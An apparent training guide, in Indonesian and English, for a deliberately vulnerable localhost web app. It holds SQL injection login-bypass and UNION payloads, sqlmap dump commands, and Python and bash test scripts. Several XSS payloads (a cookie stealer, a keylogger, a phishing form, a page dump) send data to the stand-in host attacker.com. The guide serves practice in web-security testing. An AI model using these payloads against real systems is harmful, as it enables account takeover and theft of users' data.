# IVWA Payload Examples & Testing Guide

## 📋 Daftar Isi

1. [SQL Injection Payloads](#sql-injection-payloads)
2. [Stored XSS Payloads](#stored-xss-payloads)
3. [Reflected XSS Payloads](#reflected-xss-payloads)
4. [Testing Tools & Techniques](#testing-tools--techniques)
5. [Video Tutorials](#video-tutorials)

---

## 💉 SQL Injection Payloads

### Location: `login.php`

SQL Injection di halaman login terjadi karena query tidak menggunakan prepared statements:

```php
// Vulnerable code
$query = "SELECT * FROM users WHERE username='" . $username . "' AND password='" . $password . "'";
```

### Basic Authentication Bypass

#### Payload 1: Simple OR condition

**Field Username:**
```
admin' OR '1'='1
```

**Field Password:**
```
anything
```

**Hasil Query:**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

**Penjelasan:** Kondisi `'1'='1'` selalu TRUE, sehingga query akan mengembalikan user pertama (admin).

---

#### Payload 2: Comment bypass

**Field Username:**
```
admin' --
```

**Field Password:**
```
anything
```

**Hasil Query:**
```sql
SELECT * FROM users WHERE username='admin' -- AND password='anything'
-- (password check di-skip karena menjadi comment)
```

**Penjelasan:** Karena `--` adalah comment di MySQL, bagian password check di-skip sepenuhnya.

---

#### Payload 3: SQL comment dengan space

**Field Username:**
```
admin' #
```

**Field Password:**
```
anything
```

**Hasil Query:**
```sql
SELECT * FROM users WHERE username='admin' # AND password='anything'
```

**Penjelasan:** `#` juga merupakan comment di MySQL.

---

### Advanced SQL Injection

#### Payload 4: UNION based injection (untuk dump semua user)

**Field Username:**
```
' UNION SELECT 1,username,password,email,full_name FROM users --
```

**Field Password:**
```
anything
```

**Result:** Bisa melihat semua username dan password dari tabel users (jika query error diganti dengan union hasil)

---

#### Payload 5: Blind SQL Injection (Time-based)

**Field Username:**
```
admin' AND SLEEP(5) --
```

**Field Password:**
```
anything
```

**Penjelasan:** Jika response lambat 5 detik, maka SQL Injection berhasil.

---

#### Payload 6: Boolean-based Blind SQL Injection

**Field Username:**
```
admin' AND 1=1 --
```

**Field Password:**
```
anything
```

**Penjelasan:** Jika login berhasil, maka kondisi TRUE. Coba `1=2` untuk FALSE.

---

### SQL Injection Testing Script

```bash
#!/bin/bash
# SQL Injection Testing Script

TARGET="http://localhost/myOwn-ivwa/login.php"
PAYLOADS=(
    "admin' OR '1'='1"
    "admin' --"
    "' OR '1'='1' --"
    "' OR 1=1 --"
    "admin' OR 'a'='a"
)

for payload in "${PAYLOADS[@]}"; do
    echo "Testing: $payload"
    curl -X POST "$TARGET" \
        -d "username=$payload" \
        -d "password=test" \
        -L -v
    echo "---"
done
```

---

## 🌐 Stored XSS Payloads

### Location: `dashboard.php` - Comment Form

Stored XSS terjadi karena input tidak di-sanitasi saat disimpan, dan tidak di-escape saat ditampilkan:

```php
// Vulnerable code - di display
<?php echo $comment['comment_text']; ?>  // TIDAK DI-ESCAPE!
```

---

### Basic XSS Payloads

#### Payload 1: Simple Alert

```html
<img src=x onerror="alert('XSS Vulnerability!')">
```

**Penjelasan:** 
- `<img>` tag dengan `src` yang invalid
- Event handler `onerror` trigger saat image tidak bisa di-load
- JavaScript di event handler dijalankan

---

#### Payload 2: Script Tag

```html
<script>alert('XSS Attack')</script>
```

**Penjelasan:** Langsung inject JavaScript code.

---

#### Payload 3: SVG Vector

```html
<svg onload="alert('XSS')">
```

**Penjelasan:** SVG tag dengan event handler yang dijalankan saat load.

---

### Advanced XSS Payloads

#### Payload 4: Cookie Stealer

```html
<img src=x onerror="fetch('http://attacker.com/steal?c='+document.cookie)">
```

**Penjelasan:** Mengirim cookie ke server attacker. ⚠️ Hanya untuk learning di localhost!

---

#### Payload 5: Session Hijacking

```html
<script>
fetch('http://attacker.com/steal', {
    method: 'POST',
    body: JSON.stringify({
        cookies: document.cookie,
        localStorage: localStorage,
        sessionStorage: sessionStorage
    })
});
</script>
```

**Penjelasan:** Steal semua data client-side sensitive.

---

#### Payload 6: Phishing Form Inject

```html
<div style="border:2px solid red; padding:20px; background:white;">
    <h2>⚠️ SESSION EXPIRED</h2>
    <p>Your session has expired. Please login again:</p>
    <form action="http://attacker.com/phish" method="POST">
        <input type="text" name="username" placeholder="Username" required>
        <input type="password" name="password" placeholder="Password" required>
        <button type="submit">Login</button>
    </form>
</div>
```

**Penjelasan:** Inject fake login form untuk capture credential.

---

#### Payload 7: Keylogger

```html
<script>
let keys = '';
document.onkeypress = function(e) {
    keys += String.fromCharCode(e.which);
    fetch('http://attacker.com/keylog', {
        method: 'POST',
        body: JSON.stringify({key: e.key, allKeys: keys})
    });
};
</script>
```

**Penjelasan:** Catat semua keyboard input dan kirim ke server.

---

#### Payload 8: Redirect to Malicious Site

```html
<img src=x onerror="window.location.href='http://malicious.com/malware.exe'">
```

**Penjelasan:** Redirect user ke malicious website.

---

#### Payload 9: Defacement

```html
<script>
document.body.innerHTML = `
    <div style="text-align:center; padding:50px;">
        <h1>HACKED BY SECURITY RESEARCHER!</h1>
        <p>This site has XSS vulnerability</p>
        <img src="https://media.giphy.com/media/RrVzUOXldFUcs/giphy.gif" width="300">
    </div>
`;
</script>
```

**Penjelasan:** Ganti seluruh halaman dengan konten baru.

---

#### Payload 10: Extract HTML Content

```html
<script>
let html = document.documentElement.outerHTML;
fetch('http://attacker.com/dump', {
    method: 'POST',
    body: html
});
</script>
```

**Penjelasan:** Extract HTML halaman dan kirim ke server.

---

### Stored XSS Testing dengan Browser Console

```javascript
// Test 1: Alert box
fetch('/myOwn-ivwa/dashboard.php', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'comment_text=<img src=x onerror="alert(\'XSS\')">'
}).then(r => r.text()).then(t => console.log(t));

// Test 2: Check if payload di-stored
fetch('/myOwn-ivwa/dashboard.php')
    .then(r => r.text())
    .then(t => {
        if (t.includes('onerror=')) {
            console.log('XSS Payload Found in Response!');
        }
    });
```

---

## 🔗 Reflected XSS Payloads

### Location: `search.php` - Query Parameter

Reflected XSS terjadi karena query parameter ditampilkan tanpa escaping:

```php
// Vulnerable code
echo "Search results for: " . $_GET['q'];  // TIDAK DI-ESCAPE!
```

---

### Basic Reflected XSS

#### Payload 1: Simple Alert via URL

**Normal URL:**
```
http://localhost/myOwn-ivwa/search.php?q=test
```

**Malicious URL:**
```
http://localhost/myOwn-ivwa/search.php?q=<img src=x onerror="alert('XSS')">
```

**URL Encoded (safer untuk share):**
```
http://localhost/myOwn-ivwa/search.php?q=%3Cimg%20src=x%20onerror=%22alert('XSS')%22%3E
```

---

#### Payload 2: Script Tag in URL

```
http://localhost/myOwn-ivwa/search.php?q=<script>alert('XSS')</script>
```

**URL Encoded:**
```
http://localhost/myOwn-ivwa/search.php?q=%3Cscript%3Ealert('XSS')%3C/script%3E
```

---

#### Payload 3: SVG Vector

```
http://localhost/myOwn-ivwa/search.php?q=<svg onload="alert('XSS')">
```

---

### Advanced Reflected XSS

#### Payload 4: Break out dari Attribute

```
http://localhost/myOwn-ivwa/search.php?q=" onerror="alert('XSS')" x="
```

**URL Encoded:**
```
http://localhost/myOwn-ivwa/search.php?q=%22%20onerror=%22alert('XSS')%22%20x=%22
```

---

#### Payload 5: Event Handler

```
http://localhost/myOwn-ivwa/search.php?q=<body onload="alert('XSS')">
```

---

#### Payload 6: Multiple Event Handlers

```
http://localhost/myOwn-ivwa/search.php?q=<img src=x onload="alert(1)" onerror="alert(2)" onclick="alert(3)">
```

---

#### Payload 7: Data Exfiltration

```
http://localhost/myOwn-ivwa/search.php?q=<img src=x onerror="fetch('http://attacker.com/steal?data='+btoa(document.cookie))">
```

---

### Reflected XSS URL Encoding Helper

```python
# Python script untuk URL encode payload
import urllib.parse

payloads = [
    '<img src=x onerror="alert(\'XSS\')">',
    '<script>alert("XSS")</script>',
    '<svg onload="alert(\'XSS\')">',
]

for payload in payloads:
    encoded = urllib.parse.quote(payload)
    url = f"http://localhost/myOwn-ivwa/search.php?q={encoded}"
    print(f"Payload: {payload}")
    print(f"URL: {url}")
    print()
```

---

## 🛠️ Testing Tools & Techniques

### 1. Manual Testing di Browser

```javascript
// Di Developer Console (F12)

// Test 1: Check if input sanitized
let testInput = '<img src=x onerror="console.log(\'XSS\')">';
console.log(document.querySelector('.comment-text').innerHTML);

// Test 2: Monitor HTTP Requests
let originalFetch = window.fetch;
window.fetch = function(...args) {
    console.log('Fetch:', args);
    return originalFetch.apply(this, args);
};

// Test 3: Monitor DOM Changes
let observer = new MutationObserver((mutations) => {
    mutations.forEach(m => console.log('DOM Changed:', m));
});
observer.observe(document.body, {subtree: true, childList: true});
```

---

### 2. Burp Suite

**Instalasi:**
```bash
# Download dari https://portswigger.net/burp/communitydownload
# Kemudian jalankan
java -jar burpsuite_community_v*.jar
```

**Setup Proxy:**
1. Buka Burp Suite
2. Go to Proxy > Intercept
3. Set browser proxy ke `127.0.0.1:8080`
4. Intercept requests

**Test SQL Injection:**
1. Intercept login request
2. Kirim ke Repeater (Ctrl+R)
3. Ubah username parameter dengan payload
4. Send dan lihat response

---

### 3. OWASP ZAP

```bash
# Installation
sudo apt install zaproxy

# Run
zaproxy

# Atau gunakan Docker
docker run -t owasp/zap2docker-weekly zap-baseline.py -t http://localhost/myOwn-ivwa
```

---

### 4. Curl Testing

```bash
# Test SQL Injection
curl -X POST "http://localhost/myOwn-ivwa/login.php" \
    -d "username=admin' OR '1'='1&password=test" \
    -L

# Test Reflected XSS
curl "http://localhost/myOwn-ivwa/search.php?q=%3Cimg%20src=x%20onerror=%22alert(1)%22%3E"

# Test dengan verbose
curl -v "http://localhost/myOwn-ivwa/search.php?q=<script>alert(1)</script>"

# Follow redirects
curl -L "http://localhost/myOwn-ivwa/login.php" \
    -d "username=admin' --&password=test"
```

---

### 5. Python Testing Script

```python
#!/usr/bin/env python3

import requests
import urllib.parse

# Configuration
BASE_URL = "http://localhost/myOwn-ivwa"
SESSION = requests.Session()

# Color codes
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
NC = '\033[0m'

def test_sql_injection():
    print(f"\n{BLUE}[*] Testing SQL Injection...{NC}")
    
    payloads = [
        "admin' OR '1'='1",
        "admin' --",
        "' OR 1=1 --"
    ]
    
    for payload in payloads:
        try:
            data = {
                'username': payload,
                'password': 'test'
            }
            response = SESSION.post(f"{BASE_URL}/login.php", data=data)
            
            if 'dashboard' in response.url or 'Login' not in response.text:
                print(f"{GREEN}[+] SQL Injection successful with payload: {payload}{NC}")
            else:
                print(f"{RED}[-] Payload failed: {payload}{NC}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{NC}")

def test_stored_xss():
    print(f"\n{BLUE}[*] Testing Stored XSS...{NC}")
    
    # First, login
    login_data = {
        'username': "admin' OR '1'='1",
        'password': 'test'
    }
    SESSION.post(f"{BASE_URL}/login.php", data=login_data)
    
    payloads = [
        '<img src=x onerror="alert(\'XSS\')">',
        '<script>alert("XSS")</script>',
        '<svg onload="alert(\'XSS\')">',
    ]
    
    for payload in payloads:
        try:
            data = {'comment_text': payload}
            response = SESSION.post(f"{BASE_URL}/dashboard.php", data=data)
            
            # Check if payload stored and reflected
            check = SESSION.get(f"{BASE_URL}/dashboard.php")
            if payload in check.text:
                print(f"{GREEN}[+] Stored XSS found: {payload[:50]}...{NC}")
            else:
                print(f"{RED}[-] Payload not stored: {payload[:50]}...{NC}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{NC}")

def test_reflected_xss():
    print(f"\n{BLUE}[*] Testing Reflected XSS...{NC}")
    
    payloads = [
        '<img src=x onerror="alert(\'XSS\')">',
        '<svg onload="alert(\'XSS\')">',
        '<script>alert("XSS")</script>',
    ]
    
    for payload in payloads:
        try:
            encoded = urllib.parse.quote(payload)
            url = f"{BASE_URL}/search.php?q={encoded}"
            response = requests.get(url)
            
            # Check if payload reflected in response
            if payload in response.text or encoded in response.text:
                print(f"{GREEN}[+] Reflected XSS found: {payload[:50]}...{NC}")
            else:
                print(f"{RED}[-] Payload not reflected: {payload[:50]}...{NC}")
        except Exception as e:
            print(f"{RED}[!] Error: {e}{NC}")

if __name__ == '__main__':
    print(f"{BLUE}╔══════════════════════════════════════════╗{NC}")
    print(f"{BLUE}║ IVWA Vulnerability Test Script          ║{NC}")
    print(f"{BLUE}╚══════════════════════════════════════════╝{NC}")
    
    test_sql_injection()
    test_stored_xss()
    test_reflected_xss()
    
    print(f"\n{GREEN}[+] Testing completed!{NC}\n")
```

---

### 6. Automated Testing dengan SQLMap

```bash
# Test SQL Injection di login form
sqlmap -u "http://localhost/myOwn-ivwa/login.php" \
    --data "username=admin&password=test" \
    --dbs

# Test search parameter
sqlmap -u "http://localhost/myOwn-ivwa/search.php?q=test" \
    --dbs

# Get specific table data
sqlmap -u "http://localhost/myOwn-ivwa/login.php" \
    --data "username=admin&password=test" \
    -D ivwa \
    -T users \
    --dump
```

---

## 📹 Video Tutorials

Rekomendasi untuk belajar lebih lanjut:

1. **OWASP Top 10** - https://www.youtube.com/watch?v=...
2. **SQL Injection Tutorial** - HackerOne, OWASP
3. **XSS Attacks** - PortSwigger Web Security Academy
4. **Burp Suite** - Elearnsecurity
5. **Penetration Testing** - TryHackMe, HackTheBox

---

## ✅ Checklist Testing

Gunakan checklist ini untuk systematic testing:

- [ ] Test SQL Injection di login
  - [ ] OR 1=1
  - [ ] Comment bypass
  - [ ] UNION injection
  
- [ ] Test Stored XSS di comment form
  - [ ] img tag
  - [ ] script tag
  - [ ] svg tag
  
- [ ] Test Reflected XSS di search
  - [ ] URL parameter
  - [ ] Event handler
  - [ ] Data exfiltration
  
- [ ] Test dengan different browsers
- [ ] Test dengan security headers
- [ ] Document findings
- [ ] Create reports

---

## ⚠️ Important Notes

```
DISCLAIMER:
- Semua payload di sini HANYA untuk testing di localhost
- Jangan gunakan untuk production atau unauthorized testing
- Always get permission sebelum testing
- Use responsibly untuk pembelajaran
```

---

Created for educational purposes only!
